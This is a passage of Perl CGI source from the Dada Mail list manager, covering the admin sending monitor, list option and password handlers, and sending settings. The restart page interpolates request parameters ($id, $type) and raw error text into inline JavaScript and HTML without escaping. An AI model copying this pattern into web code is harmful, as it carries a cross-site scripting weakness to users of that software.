            die "mailout does NOT exists! What's going on?!"; 
        
        }
    }elsif ($q->param('process') eq 'pause'){ 
        if(DADA::Mail::MailOut::mailout_exists($list, $id, $type) == 1){  
            
            my $mailout = DADA::Mail::MailOut->new({ -list => $list }); 
               $mailout->associate($id, $type);
               $mailout->pause(); 
               
            print $q->redirect(
					-url => $DADA::Config::S_PROGRAM_URL . '?f=sending_monitor&id=' . $id . '&type=' . $type . '&paused_it=1'
				);
				
        }
        else { 
        
            die "mailout does NOT exists! What's going on?!"; 
        
        }
    
    }
    elsif ($q->param('process') eq 'resume'){ 
        if(DADA::Mail::MailOut::mailout_exists($list, $id, $type) == 1){  
            
            my $mailout = DADA::Mail::MailOut->new({ -list => $list }); 
               $mailout->associate($id, $type);
               $mailout->resume(); 

            print $q->redirect(
				-url => $DADA::Config::S_PROGRAM_URL . '?f=sending_monitor&id=' . $id . '&type=' . $type . '&resume_it=1'
			); 
        }
        else { 
        
            die "mailout does NOT exists! What's going on?!"; 
        
        }
    
    # Restart is usually called by the program itself, automagically via a redirect if DADA::Mail::MailOut says we should restart. 
    }
    elsif ($q->param('process') eq 'restart'){ 


        print $q->header();
        
        print "<html> 
                <head> 
                 
                 <script type=\"text/javascript\">
                 
                 function refreshpage(sec){ 

                    var refreshafter = sec/1 * 1000; 
                    setTimeout(\"self.location.href='$DADA::Config::S_PROGRAM_URL?f=sending_monitor&id=$id&type=$type&restart_count=$restart_count';\",refreshafter);
                }
                
                </script> 
                

                 </head> 
                 <body> 
                 ";
        
        my $restart_time = 1; 
        
        # Let's make sure that restart worked...
        eval { $mh->restart_mass_send($id, $type); }; 
        
        # If not...
        if($@){ 
            
            print "<h1>Problems Reloading!:</h1><pre>$@</pre>"; 
            
            # We're going to refresh, see if it gets better.
            $restart_time = 5; 
            
        
        }

        # Provide a link in case browser redirect is working
        print '<a href="' . "$DADA::Config::S_PROGRAM_URL?f=sending_monitor&id=$id&type=$type&restart_count=$restart_count" . '">Reloading Mailing...</a>'; 

        print "
        
        <script> 
        refreshpage($restart_time); 
        </script> 
        </body>
       </html>"; 
        
       return; 
    }
    
    # No id? No problem, show them the index page. 
    
    if(!$q->param('id')){ 
        my $mailout_status = []; 
		my @lists;
		
		if($root_login == 1){ 
			@lists = available_lists();
		}
		else { 
			@lists = ($list); 
		}
		
		foreach my $l_list(@lists){  
        	my @mailouts  = DADA::Mail::MailOut::current_mailouts(
							{ 
								-list     => $l_list, 
								-order_by => 'creation',
							}
						);  
			foreach my $mo(@mailouts){
	
				my $mailout = DADA::Mail::MailOut->new({ -list => $l_list }); 
	               $mailout->associate(
						$mo->{id}, 
						$mo->{type}
					); 
	            my $status  = $mailout->status(); 
				require DADA::MailingList::Settings; 
				my $l_ls = DADA::MailingList::Settings->new({-list => $l_list}); 
	            push(@$mailout_status, 
					{
						
						%$status, 
						list                         => $l_list, 
						current_list                 => (($list eq $l_list) ? 1 : 0), 
						S_PROGRAM_URL                => $DADA::Config::S_PROGRAM_URL, 
						Subject                      => $status->{email_fields}->{Subject},
						status_bar_width             => int($status->{percent_done}) * 1,
						negative_status_bar_width    => 100 - (int($status->{percent_done}) * 1), 
						message_id                   => $mo->{id}, 
						message_type                 => $mo->{type},
						mailing_started              => scalar(localtime($status->{first_access})), 
						mailout_stale                => $status->{mailout_stale}, 
						%{$l_ls->params},
	            	}
	        	);
			}
		}
		
		
 

                  
            
            my (
				$monitor_mailout_report, 
				$total_mailouts, 
				$active_mailouts, 
				$paused_mailouts, 
				$queued_mailouts,
				$inactive_mailouts
				) = DADA::Mail::MailOut::monitor_mailout(
						{
							-verbose => 0, 
							($root_login == 1) ? () : (-list => $list)
						}
					); 

            require DADA::Template::Widgets;  
            my $scrn = DADA::Template::Widgets::screen(
					{
						-screen => 'sending_monitor_index_screen.tmpl', 
                         -vars   => { 
							screen                       => 'sending_monitor', 
							title                        => 'Monitor Your Mailings',
							killed_it                    => $q->param('killed_it') ? 1 : 0,
							mailout_status               => $mailout_status,
							auto_pickup_dropped_mailings => $li->{auto_pickup_dropped_mailings}, 
							monitor_mailout_report       => $monitor_mailout_report, 
						},
					}
				);
    	
	   print(admin_template_header(      
	                  -Title      => "Monitor Your Mailing", 
	                  -List       => $list, 
	                  -Root_Login => $root_login,
	                  -Form       => 0, 

	              ));
		print $scrn; 
        print admin_template_footer(
			-List => $list,
		);
 
    }else{ 
     
        my $mailout;
        my $status = {};
        my $mailout_exists = 0; 
    
    
        my $mailout_exists = 0; 
        my $my_test_mailout_exists = 0; 
        
        eval {$my_test_mailout_exists = DADA::Mail::MailOut::mailout_exists($list, $id, $type);}; 
        
        if(!$@){ 
            $mailout_exists = $my_test_mailout_exists;  
        }
        
        if($mailout_exists){  
        
            $mailout_exists = 1; 
            $mailout        = DADA::Mail::MailOut->new({ -list => $list }); 
            
            $mailout->associate($id, $type);
            $status         = $mailout->status(); 

        }else { 
        
            # Nothing - I believe this is handled in the template. 
        
        }
        
        
            my (
				$monitor_mailout_report, 
				$total_mailouts, 
				$active_mailouts, 
				$paused_mailouts, 
				$queued_mailouts, 
				$inactive_mailouts
				) = DADA::Mail::MailOut::monitor_mailout(
						{
							-verbose => 0, 
							-list    => $list
						}
					); 
            
            my $its_killed = 0;             
            if($status->{should_be_restarted}){ 
                $its_killed = 1; 
            }
            
            if(
               
               $its_killed                                                  == 1  && # It's dead in the water.
               $li->{auto_pickup_dropped_mailings}                          == 1 && # Auto Pickup is turned on...
              # $status->{total_sending_out_num} - $status->{total_sent_out} >  0 && # There's more subscribers to send out to
               $restart_count                                               <= 0 && # We haven't *just* restarted this thing
               $status->{mailout_stale}                                     != 1 &&   # The mailout hasn't been sitting around too long without being restarted, 
               
               $active_mailouts                                             < $DADA::Config::MAILOUT_AT_ONCE_LIMIT # There's not already too many mailouts going out. 
               
               ){ 
               
               # Whew! Take that for making sure that the damn thing is supposed to be sent. 
                              
                print $q->redirect(
						-url => $DADA::Config::S_PROGRAM_URL . '?f=sending_monitor&id=' . $id . '&process=restart&type=' . $type . '&restart_count=1'
						); 
                return; 
            
            } else { 
                $restart_count = 0; 
            }


            my $sending_status = []; 
            foreach(keys %$status){ 
                next if $_ eq 'email_fields'; 
                push(@$sending_status, {key => $_, value => $status->{$_}}); 
                
            }
          
           # 8 is the factory default setting to wait per batch. 
           # Let's not refresh an faster, or we'll never have time
           # to read the actual screen. 
           
           my $refresh_after = 10; 
           if($refresh_after < $li->{bulk_sleep_amount}){ 
				$refresh_after = $li->{bulk_sleep_amount};
			} 
          
          # If we're... say... 2x a batch setting and NOTHING has been sent, 
          # let's say a mailing will be automatically started in... time since last - wait time. 
          
          my $will_restart_in = undef; 
          if(time - $status->{last_access} > ($li->{bulk_sleep_amount} * 1.5)){ 
	
			my $tardy_threshold = $li->{bulk_sleep_amount} * 3; 
			if($tardy_threshold < 60){ 
				$tardy_threshold = 60;
			}
			
            $will_restart_in = $tardy_threshold - (time - $status->{last_access});
            if($will_restart_in >= 1){ 
                 $will_restart_in =   _formatted_runtime($will_restart_in); 
            }
            else { 
                $will_restart_in = undef; 
            }
          }

		  my $hourly_rate = 0; 
		  if($status->{mailing_time} > 0){ 
		  	$hourly_rate = commify(int(($status->{total_sent_out} / $status->{mailing_time}) * 60 * 60 + .5)); 		
      	  }


       
                  
           require DADA::Template::Widgets;  
           my $scrn =  DADA::Template::Widgets::screen(
						{
							-screen => 'sending_monitor_screen.tmpl', 
                            -vars   => { 
								screen                       => 'sending_monitor', 
								title                        => 'Monitor Your Mailings',


								mailout_exists               => $mailout_exists, 
								message_id                   => DADA::App::Guts::strip($id),
								message_type                 => $q->param('type'),
								total_sent_out               => $status->{total_sent_out},
								total_sending_out_num        => $status->{total_sending_out_num},
								mailing_time                 => $status->{mailing_time}, 
								mailing_time_formatted       => $status->{mailing_time_formatted}, 
								hourly_rate                  => $hourly_rate, 
								percent_done                 => $status->{percent_done}, 
								status_bar_width             => int($status->{percent_done}) * 5,  
								negative_status_bar_width    => 500 - (int($status->{percent_done}) * 5), 
								need_to_send_out             => ( $status->{total_sending_out_num} - $status->{total_sent_out}), 
								time_since_last_sendout      => _formatted_runtime((time - int($status->{last_access}))), 
								its_killed                   => $its_killed, 
								header_subject               => $status->{email_fields}->{Subject}, 
								header_subject_label         => (length($status->{email_fields}->{Subject}) > 50) ? (substr($status->{email_fields}->{Subject}, 0, 49) . '...') : ($status->{email_fields}->{Subject}),  
								auto_pickup_dropped_mailings => $li->{auto_pickup_dropped_mailings}, 
								sending_done                 => ($status->{percent_done} < 100) ? 0 : 1, 
								refresh_after                => $refresh_after, 
								killed_it                    => $q->param('killed_it') ? 1 : 0, 
								sending_status               => $sending_status, 
								is_paused                    => $status->{paused} > 0 ? 1 : 0,  
								paused                       => $status->{paused}, 
								queue                        => $status->{queue},
								queued_mailout               => $status->{queued_mailout}, 
								queue_place                  => ($status->{queue_place} + 1), # adding one since humans like counting from, "1" 
								queue_total                  => ($status->{queue_total} + 1), # adding one since humans like counting from, "1"
								status_mailout_stale         => $status->{mailout_stale},
								MAILOUT_AT_ONCE_LIMIT        => $DADA::Config::MAILOUT_AT_ONCE_LIMIT, 
								will_restart_in              => $will_restart_in, 
								integrity_check              => $status->{integrity_check},

							},
						}
					);
			print admin_template_header(      
				                  -Title      => "Monitor Your Mailing", 
				                  -List       => $list, 
				                  -Root_Login => $root_login,
				                 );
			print $scrn; 
            print admin_template_footer(
					-List => $list, 
				);
    }
}



sub print_mass_mailing_log { 
	
	my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,  
                                                        -Function => 'sending_monitor');


	my $id   = $q->param('id'); 
	my $type = $q->param('type'); 
	
	$list = $admin_list; 

	require DADA::Mail::MailOut; 
	my $mailout = DADA::Mail::MailOut->new({ -list => $list }); 
	   $mailout->associate($id, $type);
	   print $q->header('text/plain'); 
	   $mailout->print_log; 	
}


sub _formatted_runtime { 
	
	my $d    = shift || 0; 
	
	my @int = (
        [ 'second', 1                ],
        [ 'minute', 60               ],
        [ 'hour',   60*60            ],
        [ 'day',    60*60*24         ],
        [ 'week',   60*60*24*7       ],
        [ 'month',  60*60*24*30.5    ],
        [ 'year',   60*60*24*30.5*12 ]
    );
    my $i = $#int;
    my @r;
    while ( ($i>=0) && ($d) )
    {
        if ($d / $int[$i] -> [1] >= 1)
        {
            push @r, sprintf "%d %s%s",
                         $d / $int[$i] -> [1],
                         $int[$i]->[0],
                         ( sprintf "%d", $d / $int[$i] -> [1] ) > 1
                             ? 's'
                             : '';
        }
        $d %= $int[$i] -> [1];
        $i--;
    }

    my $runtime;
    if (@r) {
        $runtime = join ", ", @r;
    } else {
        $runtime = '0 seconds';
    }  
  
    return $runtime; 
}




sub send_url_email { 
	
	require DADA::App::MassSend; 
	my $ms = DADA::App::MassSend->new; 
	   $ms->send_url_email(
			{
				-cgi_obj     => $q, 
				-dbi_handle  => $dbi_handle,
			}
		); 	
}




sub list_invite { 
	
	require DADA::App::MassSend; 
	my $ms = DADA::App::MassSend->new; 
	   $ms->list_invite(
			{
				-cgi_obj     => $q, 
				-dbi_handle  => $dbi_handle,
			}
		); 	
}




sub change_info { 
    
    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q, 
                                                        -Function => 'change_info');
    
    $list = $admin_list; 
    
    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    
    my $errors = 0; 
    my $flags  = {}; 
    
    if($process){
    
        ($errors, $flags) = check_list_setup(-fields => { list             => $list, 
                                                          list_name         => $list_name, 
                                                          list_owner_email  => $list_owner_email,
                                                          admin_email       => $admin_email, 
                                                          privacy_policy    => $privacy_policy,
                                                          info                => $info,
                                                          physical_address  => $physical_address,
                                                          }, 
                                                -new_list         => 'no',
                                              ); 
    }
    
    undef $process
        if $errors >= 1;
        
    if(!$process){
    
        my $err_word      = 'was'; 
           $err_word      = 'were' 
            if $errors && $errors > 1; 
        
        my $errors_ending = '';
           $errors_ending = 's'      
            if $errors && $errors > 1;  
        
        my $flags_list_name                = $flags->{list_name}                  || 0;

        my $flags_list_name_bad_characters = $flags->{list_name_bad_characters}                  || 0;

        my $flags_invalid_list_owner_email = $flags->{invalid_list_owner_email}   || 0; 
        my $flags_list_info                = $flags->{list_info}                  || 0;
        my $flags_privacy_policy           = $flags->{privacy_policy}             || 0;
        my $flags_physical_address         = $flags->{physical_address}           || 0;
        
        
        print(admin_template_header(-Title      => "Change List Information",
                                -List       => $list,
                                -Root_Login => $root_login));
        
        require DADA::Template::Widgets;
        print DADA::Template::Widgets::screen({-screen => 'change_info_screen.tmpl', 
                                              -vars   => {
			
														screen                         => 'change_info', 
														title                          => 'Change List Information', 
															
                                                        done                           => $done,
                                                        errors                         => $errors,
                                                        errors_ending                  => $errors_ending,
                                                        err_word                       => $err_word,
                                                        list                           => $list,
                                                        list_name                      => $list_name        ? $list_name        : $li->{list_name},
                                                        list_owner_email               => $list_owner_email ? $list_owner_email : $li->{list_owner_email}, 
                                                        admin_email                    => $admin_email      ? $admin_email      : $li->{admin_email},
                                                        info                           => $info             ? $info             : $li->{info},
                                                        privacy_policy                 => $privacy_policy   ? $privacy_policy   : $li->{privacy_policy},
                                                        physical_address               => $physical_address ? $physical_address : $li->{physical_address},
                                                        flags_list_name                => $flags_list_name, 
                                                        flags_invalid_list_owner_email => $flags_invalid_list_owner_email, 
                                                        flags_list_info                => $flags_list_info, 
                                                        flags_privacy_policy           => $flags_privacy_policy, 
                                                        flags_physical_address         => $flags_physical_address,
                                                        flags_list_name_bad_characters => $flags_list_name_bad_characters, 
                                                                                                                
                                                     },
                                             });
                                             
                                             
         
        print(admin_template_footer(-List => $list));
    
    }else{ 
        
        $admin_email = $list_owner_email 
            unless defined($admin_email);  
        
        $ls->save({ 
                    list_owner_email =>   strip($list_owner_email),
                    admin_email      =>   strip($admin_email), 
                    list_name        =>   $list_name, 
                    info             =>   $info, 
                    privacy_policy   =>   $privacy_policy,
                    physical_address =>   $physical_address,    
                    
                   }); 
                    
        print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=change_info&done=1'); 
    
    }
}





sub change_password { 
    
    my ($admin_list, $root_login) = check_list_security(
										-cgi_obj  => $q,
                                        -Function => 'change_password',
                                     );

    
    $list = $admin_list;
    
    require DADA::Security::Password; 
    require DADA::MailingList::Settings; 
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
     
    if(!$process) { 

        print admin_template_header(
				-Title      => "Change List Password", 
                -List       => $list,
                -Root_Login => $root_login,
			  ); 

        require DADA::Template::Widgets;
        print   DADA::Template::Widgets::screen(
					{
						-screen => 'change_password_screen.tmpl',
                        -list   => $list,
                        -vars   => { 
	
							screen     => 'change_password',
							title      => ' Change List Password',
    
                    		root_login => $root_login, 
                        	},
                 	}
				); 

        print admin_template_footer(
				-List => $list
			  );

    }else{ 

        my $old_password       = $q->param('old_password'); 
        my $new_password       = $q->param('new_password'); 
        my $again_new_password = $q->param('again_new_password'); 

        if($root_login != 1){ 
            my $password_check = DADA::Security::Password::check_password($li->{password},$old_password); 
            if ($password_check != 1) { 
                user_error(
					-List  => $list, 
                    -Error => "invalid_password"
				);
                return; 
            }
        }

        $new_password       = strip($new_password);
        $again_new_password = strip($again_new_password);
        
        if ( $new_password ne $again_new_password || 
             $new_password eq ""
 		){ 
            user_error(
				-List  => $list, 
                -Error => "list_pass_no_match");
            return; 
        } 

        $ls->save(
			{ 
            	password => DADA::Security::Password::encrypt_passwd($new_password),
            }
		);
         
        # -no_list_security_check, because the list password's changed, it wouldn't pass it anyways...
        logout(
			-no_list_security_check => 1, 
			-redirect_url            => $DADA::Config::S_PROGRAM_URL . '?f=' . $DADA::Config::SIGN_IN_FLAVOR_NAME . '&list=' . $list,
		);  
        #print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=' . $DADA::Config::ADMIN_FLAVOR_NAME); 
        return;
    }
}




sub delete_list { 

    my ($admin_list, $root_login) = check_list_security(
										-cgi_obj  => $q,
                                        -Function => 'delete_list'
									);

    my $list = $admin_list; 
    
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    if(!$process){ 
    
        print admin_template_header(      
              	-Title      => "Confirm Delete List", 
              	-List       => $list,
              	-Root_Login => $root_login,
				);
        
        require DADA::Template::Widgets;
        print   DADA::Template::Widgets::screen(
					{
						-screen => 'delete_list_screen.tmpl', 
                        -list   => $list,
						-vars   => { 
							screen => 'delete_list', 
							title  => 'Delete This List', 
						}
                    }
				); 

        print(admin_template_footer(-List => $list));
    
    
    }else{
        
        require DADA::MailingList; 
        DADA::MailingList::Remove(
            {
                -name           => $list,
                -delete_backups => xss_filter($q->param('delete_backups')), 
            }
        ); 
        

        $c->flush;
       
        my $logout_cookie = logout(-redirect => 0); 
      
        print(list_template(-Part  => 'header', -Title => "Deletion Successful", -header_params => {-COOKIE => $logout_cookie}));

        require DADA::Template::Widgets;
        print   DADA::Template::Widgets::screen({-screen => 'delete_list_success_screen.tmpl',
                                                -list   => $list,
                                               }); 
        print(list_template(-Part => 'footer'));    
    }
}




sub list_options { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                        -Function => 'list_options');
                                                        
    $list = $admin_list; 
    
    #receive a few variables.. 
    my $closed_list                        =   $q->param("closed_list")                     || 0; 
    my $hide_list                          =   $q->param("hide_list")                       || 0;
    my $get_sub_notice                     =   $q->param("get_sub_notice")                  || 0;  
    my $get_unsub_notice                   =   $q->param("get_unsub_notice")                || 0;  
    my $no_confirm_email                   =   $q->param("no_confirm_email")                || 0;  
	my $skip_sub_confirm_if_logged_in          =   $q->param('skip_sub_confirm_if_logged_in')       || 0; 
    my $unsub_confirm_email                =   $q->param("unsub_confirm_email")             || 0; 
	my $skip_unsub_confirm_if_logged_in    =   $q->param('skip_unsub_confirm_if_logged_in') || 0; 
    my $send_unsub_success_email           =   $q->param("send_unsub_success_email")        || 0; 
    my $send_sub_success_email             =   $q->param("send_sub_success_email")          || 0; 
    my $mx_check                           =   $q->param("mx_check")                        || 0;  

    my $limit_sub_confirm                  =   $q->param('limit_sub_confirm')               || 0; 
    my $limit_unsub_confirm                =   $q->param('limit_unsub_confirm')             || 0; 
    
    my $email_your_subscribed_msg          =   $q->param('email_your_subscribed_msg')       || 0;   

    my $use_alt_url_sub_confirm_success     = $q->param("use_alt_url_sub_confirm_success")   || 0; 
    my $alt_url_sub_confirm_success         = $q->param(    "alt_url_sub_confirm_success")   || '';
    my $alt_url_sub_confirm_success_w_qs   = $q->param('alt_url_sub_confirm_success_w_qs')  || 0; 

    my $use_alt_url_sub_confirm_failed         = $q->param("use_alt_url_sub_confirm_failed")    || 0; 
    my     $alt_url_sub_confirm_failed         = $q->param(    "alt_url_sub_confirm_failed")    || ''; 
    my     $alt_url_sub_confirm_failed_w_qs    = $q->param('alt_url_sub_confirm_failed_w_qs')   || 0; 


	my $enable_subscription_approval_step     = $q->param('enable_subscription_approval_step') || 0;


    my $captcha_sub                            = $q->param('captcha_sub')                   || 0; 


    
    my $use_alt_url_sub_success            = $q->param("use_alt_url_sub_success")           || 0; 
    my     $alt_url_sub_success            = $q->param(    "alt_url_sub_success")           || '';
    my     $alt_url_sub_success_w_qs       = $q->param(    'alt_url_sub_success_w_qs')      || 0; 
    
    my $use_alt_url_sub_failed             = $q->param("use_alt_url_sub_failed")            || 0; 
        my $alt_url_sub_failed             = $q->param(    "alt_url_sub_failed")            || ''; 
        my $alt_url_sub_failed_w_qs        = $q->param('alt_url_sub_failed_w_qs')           || 0; 
        
    my $use_alt_url_unsub_confirm_success      = $q->param("use_alt_url_unsub_confirm_success")  || 0; 
        my $alt_url_unsub_confirm_success      = $q->param(    "alt_url_unsub_confirm_success")  || '';
        my $alt_url_unsub_confirm_success_w_qs = $q->param('alt_url_unsub_confirm_success_w_qs') || 0; 
    
    my $use_alt_url_unsub_confirm_failed       = $q->param("use_alt_url_unsub_confirm_failed")  || 0; 
        my $alt_url_unsub_confirm_failed       = $q->param(    "alt_url_unsub_confirm_failed")  || '';    
        my $alt_url_unsub_confirm_failed_w_qs  = $q->param('alt_url_unsub_confirm_failed_w_qs') || 0; 

    my $use_alt_url_unsub_success          = $q->param("use_alt_url_unsub_success")         || 0; 
        my $alt_url_unsub_success          = $q->param(    "alt_url_unsub_success")         || '';
        my $alt_url_unsub_success_w_qs     = $q->param('alt_url_unsub_success_w_qs')        || 0; 

    
    
    my $use_alt_url_unsub_failed           = $q->param("use_alt_url_unsub_failed")          || 0; 
        my $alt_url_unsub_failed           = $q->param(    "alt_url_unsub_failed")          || ''; 
        my $alt_url_unsub_failed_w_qs      = $q->param('alt_url_unsub_failed_w_qs')         || 0; 

    
    
    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get();  
    
    my $can_use_mx_lookup = 0; 
     
    eval { require Net::DNS; };
    if(!$@){ 
        $can_use_mx_lookup = 1;
    }
    
	my $can_use_captcha = 0; 
	eval { require DADA::Security::AuthenCAPTCHA; };
	if(!$@){ 
		$can_use_captcha = 1;        
	}	
	
    
    if(!$process){ 
    
        $list = $admin_list;
        

        
        print(admin_template_header(      
                                -Title      => "Mailing List Options", 
                                -List       => $list, 
                                -Root_Login => $root_login
                               ));
                               
 	   require DADA::Template::Widgets;
	    print   DADA::Template::Widgets::screen({-screen => 'list_options_screen.tmpl', 
	                                                -list   => $list,
	                                                -vars   => { 
		
																screen            => 'list_options', 
																title             => 'Mailing List Options', 
																
	                                                            done              => $done, 
	                                                            CAPTCHA_TYPE      => $DADA::Config::CAPTCHA_TYPE, 
															    can_use_mx_lookup => $can_use_mx_lookup, 
	                                                            can_use_captcha  =>  $can_use_captcha, 
	                                                            %{$li},
	                                                }
                                                
	                                                }); 
        
        
        print(admin_template_footer(-List => $list));
        
    }else{ 
        
        $list = $admin_list;

        $ls->save({
        
            hide_list                          => $hide_list,
            closed_list                        => $closed_list,
            get_sub_notice                     => $get_sub_notice, 
            get_unsub_notice                   => $get_unsub_notice, 
            no_confirm_email                   => $no_confirm_email,
			skip_sub_confirm_if_logged_in          => $skip_sub_confirm_if_logged_in, 
            unsub_confirm_email                => $unsub_confirm_email,
			skip_unsub_confirm_if_logged_in    => $skip_unsub_confirm_if_logged_in, 
            send_unsub_success_email           => $send_unsub_success_email,
            send_sub_success_email             => $send_sub_success_email,
            mx_check                           => $mx_check,
            limit_sub_confirm                  => $limit_sub_confirm, 
            limit_unsub_confirm                => $limit_unsub_confirm,
            
            
            email_your_subscribed_msg               => $email_your_subscribed_msg, 
            
            use_alt_url_sub_confirm_success         => $use_alt_url_sub_confirm_success,
                alt_url_sub_confirm_success         =>     $alt_url_sub_confirm_success,
                alt_url_sub_confirm_success_w_qs    =>     $alt_url_sub_confirm_success_w_qs, 

            use_alt_url_sub_confirm_failed          => $use_alt_url_sub_confirm_failed,
                alt_url_sub_confirm_failed          =>     $alt_url_sub_confirm_failed,
               alt_url_sub_confirm_failed_w_qs      =>     $alt_url_sub_confirm_failed_w_qs, 

            use_alt_url_sub_success                 => $use_alt_url_sub_success,
                alt_url_sub_success                 =>     $alt_url_sub_success,
                alt_url_sub_success_w_qs            =>     $alt_url_sub_success_w_qs,
                
            use_alt_url_sub_failed                  => $use_alt_url_sub_failed,
                alt_url_sub_failed                  =>     $alt_url_sub_failed,
                alt_url_sub_failed_w_qs             =>     $alt_url_sub_failed_w_qs,
            
            use_alt_url_unsub_confirm_success       =>  $use_alt_url_unsub_confirm_success,
                alt_url_unsub_confirm_success       =>      $alt_url_unsub_confirm_success,
                alt_url_unsub_confirm_success_w_qs  =>      $alt_url_unsub_confirm_success_w_qs,
            
            use_alt_url_unsub_confirm_failed        => $use_alt_url_unsub_confirm_failed,
                alt_url_unsub_confirm_failed        =>     $alt_url_unsub_confirm_failed,
                alt_url_unsub_confirm_failed_w_qs   =>     $alt_url_unsub_confirm_failed_w_qs, 

            use_alt_url_unsub_success               => $use_alt_url_unsub_success,
                alt_url_unsub_success               =>     $alt_url_unsub_success,
                alt_url_unsub_success_w_qs          =>     $alt_url_unsub_success_w_qs, 
            
            use_alt_url_unsub_failed                => $use_alt_url_unsub_failed,
                alt_url_unsub_failed                =>     $alt_url_unsub_failed,
                alt_url_unsub_failed_w_qs           =>     $alt_url_unsub_failed_w_qs, 
                
                enable_subscription_approval_step  => $enable_subscription_approval_step, 
                captcha_sub                         => $captcha_sub, 
                
            
        }); 
        
        print $q->redirect(-uri=>$DADA::Config::S_PROGRAM_URL . '?flavor=list_options&done=1'); 
    }
}




sub sending_options { 

    my ($admin_list, $root_login) = check_list_security(
										-cgi_obj  => $q,
                                        -Function => 'sending_options'
									);

    $list = $admin_list;

    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    if(!$process){ 
    

        
        my @message_amount = (1..180); 
        
                           #  , 30, 40, 50, 60, 70, 
                            #  80, 90, 100, 150, 200, 
                            #  250, 300, 350, 400, 450, 
                            #  500, 1000, 1500, 2000, 
                            #  4000, 6000, 8000, 10000); 
                              
        unshift(@message_amount, $li->{mass_send_amount}) 
            if exists($li->{mass_send_amount}); 
        
        my @message_wait = (1..60,  
	                        70, 80, 90, 100, 
	                        110, 110, 120, 130, 
	                        140, 150, 160, 170, 180
	                        ); 
                               
        unshift(@message_wait, $li->{bulk_sleep_amount}) 
            if exists($li->{bulk_sleep_amount}); 


       # my @message_label = (1, 60, 3600); 
       
        my @message_label = (1);
        
        
        my %label_label = (1     => 'second(s)',
                           #60    => 'minute(s)', 
                           #3600  => 'hour(s)', 
                           #86400 => 'day(s)',
                          ); 


        my $mass_send_amount_menu   = $q->popup_menu(-name     => "mass_send_amount", 
                                                     -id       => "mass_send_amount", 
                                                     -value    => [@message_amount],
                                                     -onChange => 'previewBatchSendingSpeed()',
                                                    );
                                                        
        my $bulk_sleep_amount_menu  =  $q->popup_menu(-name     => "bulk_sleep_amount", 
                                                      -id       => "bulk_sleep_amount", 
                                                      -value    => [@message_wait],  
                                                      -onChange => 'previewBatchSendingSpeed()',
                                                     );                                                
                                             
        my $no_smtp_server_set = 0; 
           $no_smtp_server_set = 1 
            if(!$li->{smtp_server}) && $li->{send_via_smtp} && ($li->{send_via_smtp} == 1);
         
        my $scrn = ''; 
        
        $scrn .= admin_template_header(      
              -Title       => "Sending Options", 
              -List        => $list, 
              -Root_Login  => $root_login
              );
      
        require DADA::Template::Widgets;
        $scrn .= DADA::Template::Widgets::screen({-screen => 'sending_options_screen.tmpl', 
                                                -vars   => {
															
															screen                            => 'sending_options',
															title                             => 'Sending Options', 
															
                                                            done                              => $done, 
                                                            send_via_smtp                     => $li->{send_via_smtp}, 
                                                            enable_bulk_batching              => $li->{enable_bulk_batching}, 
															adjust_batch_sleep_time            => $li->{adjust_batch_sleep_time}, 
                                                            get_finished_notification         => $li->{get_finished_notification}, 
                                                            no_smtp_server_set                => $no_smtp_server_set, 
                                                            perl_version                      =>  $], 
                                                            mass_send_amount_menu             => $mass_send_amount_menu, 
                                                            bulk_sleep_amount_menu            => $bulk_sleep_amount_menu, 
                                                            
                                                            
                                                            auto_pickup_dropped_mailings      => $li->{auto_pickup_dropped_mailings}, 
                                                            restart_mailings_after_each_batch => $li->{restart_mailings_after_each_batch}, 
                                                            
                                                            

                                                      },
                                             });
    
        $scrn .= admin_template_footer(-List => $list);
		print $scrn; 
    }else{ 
        
        my $mass_send_amount           = $q->param("mass_send_amount"); 
        my $bulk_sleep_amount          = $q->param("bulk_sleep_amount"); 
        my $precedence                 = $q->param('precedence');
        my $charset                    = $q->param('charset');
        my $content_type               = $q->param('content_type');
        my $enable_bulk_batching       = $q->param("enable_bulk_batching")       || 0;  
        my $adjust_batch_sleep_time     = $q->param('adjust_batch_sleep_time')     || 0;
		my $get_finished_notification  = $q->param("get_finished_notification")  || 0;  
        my $send_via_smtp              = $q->param("send_via_smtp")              || 0;
   
        my $auto_pickup_dropped_mailings      = $q->param('auto_pickup_dropped_mailings')      || 0; 
        my $restart_mailings_after_each_batch = $q->param('restart_mailings_after_each_batch') || 0; 
        
 


        $ls->save({ 
                    mass_send_amount           =>   $mass_send_amount,  
                    bulk_sleep_amount          =>   $bulk_sleep_amount, 
                    
                    enable_bulk_batching       =>   $enable_bulk_batching, 
					adjust_batch_sleep_time     =>   $adjust_batch_sleep_time,  
                    bulk_sleep_amount          =>   $bulk_sleep_amount,
                    get_finished_notification  =>   $get_finished_notification,
                    send_via_smtp              =>   $send_via_smtp,
                    
                    auto_pickup_dropped_mailings      => $auto_pickup_dropped_mailings, 
                    restart_mailings_after_each_batch => $restart_mailings_after_each_batch, 
                    
                    
                    
                    
                  }); 
                
        print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=sending_options&done=1'); 
    }
}




sub previewBatchSendingSpeed { 


  my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                      -Function => 'sending_options');

    $list = $admin_list;

	my $lh = DADA::MailingList::Subscribers->new({-list => $list}); 
	

    print $q->header(); 
    
    my $enable_bulk_batching = xss_filter($q->param('enable_bulk_batching')); 
    my $mass_send_amount     = xss_filter($q->param('mass_send_amount'));    
    my $bulk_sleep_amount    = xss_filter($q->param('bulk_sleep_amount'));    
    
	my $per_hour         = 0; 
	my $num_subs         = 0; 
	my $time_to_send     = 0; 
	my $somethings_wrong = 0; 
	
